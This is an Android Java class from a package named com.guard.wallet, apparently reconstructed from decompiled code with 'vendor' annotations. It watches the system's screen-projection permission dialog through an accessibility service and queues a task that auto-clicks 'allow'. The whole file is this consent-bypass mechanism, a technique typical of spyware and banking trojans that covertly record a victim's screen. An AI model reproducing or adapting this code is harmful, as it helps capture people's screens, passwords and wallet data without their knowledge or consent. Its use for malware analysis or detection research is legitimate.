package com.guard.wallet.delegate;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.guard.wallet.req.ListenWindow;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * vendor o/o — MediaProjectionPermissionDelegate.
 * Monitors com.android.systemui MediaProjectionPermissionActivity.
 * Auto-clicks "allow" when screen projection permission dialog appears.
 */
public final class MediaProjectionDelegate extends AccessibilityDelegate {

    /** vendor o — synthetic constant (always 0) */
    public static final int __synthetic_0 = 0;

    /** vendor n — pending operation queue */
    public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

    public MediaProjectionDelegate() {
        super(Collections.singletonList(H()), "com.android.systemui");
    }

    /**
     * vendor H() — build ListenWindow for MediaProjectionPermissionActivity.
     * Listens for WINDOW_STATE_CHANGED (32) and WINDOW_CONTENT_CHANGED (16384).
     */
    public static ListenWindow H() {
        ListenWindow lw = new ListenWindow("com.android.systemui",
                "com.android.systemui.media.MediaProjectionPermissionActivity");
        FilterHelper.addEventType(16384, FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw), lw);
        return lw;
    }

    /** vendor d() — cleanup: cancel pending tasks, clear queue, call super */
    @Override
    public final void d() {
        com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
        this.n.clear();
        super.d();
    }

    /**
     * vendor u(event, packageName, className) — handle accessibility event.
     * If current window matches MediaProjection permission dialog,
     * queue "allowInMediaProjection" task to auto-click allow button.
     */
    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        super.u(event, packageName, className);

        boolean matched;
        if (this.q(Collections.singletonList(H()))) {
            Log.d("o.o", "已进入是否允许屏幕投影权限窗口");
            matched = true;
        } else {
            matched = false;
        }

        if (matched) {
            ConcurrentLinkedQueue queue = this.n;
            if (!queue.contains("allowInMediaProjection")) {
                queue.add("allowInMediaProjection");
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.ConfirmLockRunnable(this, 3), super.c);
            }
        }
    }
}
